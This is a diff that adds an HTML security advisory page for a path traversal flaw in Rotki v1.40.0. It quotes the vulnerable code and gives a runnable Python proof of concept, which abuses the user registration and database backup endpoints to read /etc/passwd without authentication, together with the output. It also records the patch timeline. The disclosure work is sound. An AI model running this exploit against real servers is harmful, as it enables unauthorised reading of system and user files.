@@ -1,0 +1,93 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>GHSA-73h4-xwvc-g83w</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> <li><a href="/wednesday/research/">research</a> </ul> </div> <div id=main ></div> </div> <div class=franklin-content ><h1 id=ghsa-73h4-xwvc-g83w ><a href="#ghsa-73h4-xwvc-g83w" class=header-anchor >GHSA-73h4-xwvc-g83w</a></h1> <h4 id=summary ><a href="#summary" class=header-anchor >Summary</a></h4> <p>The user registration endpoint at <code>/api/1/users</code> in Rotki v1.40.0 is vulnerable to path traversal. When combined with the database backup download feature at <code>/api/1/database/backups</code>, this allows unauthenticated attackers to read arbitrary files from the application filesystem in directories where the application process has write permissions.</p> <h4 id=details ><a href="#details" class=header-anchor >Details</a></h4> <p>In Rotki, the <code>PUT /api/1/users</code> API endpoint is used to register a new user. The route calls <code>RestAPI.create_new_user&#40;&#41;</code> which in turn calls <code>Rotkehlchen.unlock_user&#40;&#41;</code> and <code>DataHandler.unlock&#40;&#41;</code>. Within this function, the application attempts to create an SQLite database for the new user, using the supplied username as a directory name:</p> <pre><code class="py hljs"><span class=hljs-keyword >def</span> <span class="hljs-title function_">unlock</span>(<span class=hljs-params >
+            self,
+            username: <span class=hljs-built_in >str</span>,
+            password: <span class=hljs-built_in >str</span>,
+            create_new: <span class=hljs-built_in >bool</span>,
+            resume_from_backup: <span class=hljs-built_in >bool</span>,
+            initial_settings: ModifiableDBSettings | <span class=hljs-literal >None</span> = <span class=hljs-literal >None</span>,
+    </span>) -&gt; Path:
+        ...
+        user_data_dir = <span class="hljs-variable language_">self</span>.data_directory / USERSDIR_NAME / username
+        <span class=hljs-keyword >if</span> create_new:
+            <span class=hljs-keyword >try</span>:
+                <span class=hljs-keyword >if</span> (user_data_dir / USERDB_NAME).exists():
+                    <span class=hljs-keyword >raise</span> AuthenticationError(
+                        <span class=hljs-string >f&#x27;User <span class=hljs-subst >{username}</span> already exists. User data dir: <span class=hljs-subst >{user_data_dir}</span>&#x27;</span>,
+                    )
+
+                user_data_dir.mkdir(parents=<span class=hljs-literal >True</span>, exist_ok=<span class=hljs-literal >True</span>)
+            <span class=hljs-keyword >except</span> PermissionError <span class=hljs-keyword >as</span> e:
+                ...
+        <span class=hljs-keyword >else</span>:
+            ...
+            
+        <span class="hljs-variable language_">self</span>.db: DBHandler = DBHandler(
+            user_data_dir=user_data_dir,
+            password=password,
+            msg_aggregator=<span class="hljs-variable language_">self</span>.msg_aggregator,
+            initial_settings=initial_settings,
+            sql_vm_instructions_cb=<span class="hljs-variable language_">self</span>.sql_vm_instructions_cb,
+            resume_from_backup=resume_from_backup,
+        )
+        <span class="hljs-variable language_">self</span>.user_data_dir = user_data_dir
+        <span class="hljs-variable language_">self</span>.logged_in = <span class=hljs-literal >True</span>
+        <span class="hljs-variable language_">self</span>.username = username
+        <span class=hljs-keyword >return</span> user_data_dir</code></pre> <p>If the SQLite database is able to be created &#40;i.e the server process has write permissions in the directory&#41;, then the resulting directory is stored in the <code>user_data_dir</code> attribute. Since the username is supplied by the user and does not undergo sanitization, an attacker can insert path traversal characters into the username in order to set <code>user_data_dir</code> to a directory of their choosing.</p> <p>The <code>GET /api/1/datbase/backups</code> endpoint can then be used to read arbitrary files from the application server. Under normal circumstances, the server checks that the requested path is located under the <code>user_data_dir</code>. However since the attacker can use the path traversal vulnerability to control <code>user_data_dir</code>, they can bypass this check.</p> <pre><code class="py hljs"><span class=hljs-keyword >def</span> <span class="hljs-title function_">download_database_backup</span>(<span class=hljs-params >self, filepath: Path</span>) -&gt; Response:
+        <span class=hljs-keyword >if</span> filepath.parent != <span class="hljs-variable language_">self</span>.rotkehlchen.data.db.user_data_dir:
+            error_msg = <span class=hljs-string >f&#x27;DB backup file <span class=hljs-subst >{filepath}</span> is not in the user directory&#x27;</span>
+            <span class=hljs-keyword >return</span> api_response(wrap_in_fail_result(error_msg), status_code=HTTPStatus.CONFLICT)
+
+        <span class=hljs-keyword >return</span> send_file(
+            path_or_file=filepath,
+            mimetype=<span class=hljs-string >&#x27;application/octet-stream&#x27;</span>,
+            as_attachment=<span class=hljs-literal >True</span>,
+            download_name=filepath.name,
+        )</code></pre> <h4 id=poc ><a href="#poc" class=header-anchor >PoC</a></h4> <p>The following script reads <code>/etc/passwd</code> from the application filesystem. This assumes that Rotki is running as root, which is the default case in the Rotki Docker image.</p> <pre><code class="py hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>
+<span class=hljs-keyword >import</span> requests
+<span class=hljs-keyword >import</span> os
+RHOST = <span class=hljs-string >&quot;http://localhost:8084&quot;</span>
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">arb_read</span>(<span class=hljs-params >s, path</span>):
+    traversed_path = <span class=hljs-string >f&quot;../../../../../../../../..<span class=hljs-subst >{path}</span>&quot;</span>
+    dirname = os.path.dirname(traversed_path) + <span class=hljs-string >&quot;/&quot;</span>
+    s.put(
+        <span class=hljs-string >f&quot;<span class=hljs-subst >{RHOST}</span>/api/1/users&quot;</span>,
+        json={
+            <span class=hljs-string >&quot;name&quot;</span>: dirname,
+            <span class=hljs-string >&quot;password&quot;</span>: <span class=hljs-string >&quot;password&quot;</span>,
+        },
+    )
+
+    r = s.get(
+        <span class=hljs-string >f&quot;<span class=hljs-subst >{RHOST}</span>/api/1/database/backups&quot;</span>,
+        params={<span class=hljs-string >&quot;file&quot;</span>: <span class=hljs-string >f&quot;/data/users/<span class=hljs-subst >{traversed_path}</span>&quot;</span>},
+    )
+    <span class=hljs-built_in >print</span>(r.text)
+    <span class=hljs-keyword >return</span> r.text
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">main</span>():
+    s = requests.Session()
+    arb_read(s, <span class=hljs-string >&quot;/etc/passwd&quot;</span>)
+
+<span class=hljs-keyword >if</span> __name__ == <span class=hljs-string >&quot;__main__&quot;</span>:
+    main()</code></pre> <pre><code class="sh hljs">❯ python arb_read.py 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class=hljs-built_in >sync</span>:x:4:65534:<span class=hljs-built_in >sync</span>:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+nginx:x:101:101:nginx user:/nonexistent:/bin/false</code></pre> <h4 id=impact ><a href="#impact" class=header-anchor >Impact</a></h4> <p>Unauthenticated attackers are able to read arbitrary files from the application filesystem in directories where the server process has write permissions.</p> <h4 id=timeline ><a href="#timeline" class=header-anchor >Timeline</a></h4> <ul> <li><p>September 8 2025: Initial disclosure to Rotki</p> <li><p>September 9 2025: Patch implemented and merged in PR <a href="https://github.com/rotki/rotki/pull/10580">#10580</a></p> </ul> </div> </div> </div> <script src="/wednesday/libs/highlight/highlight.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script> <script src="/wednesday/libs/highlight/rust.min.js"></script> <script src="/wednesday/libs/highlight/csharp.min.js"></script> <script> hljs.highlightAll(); hljs.configure({ tabReplace: " " }); </script>
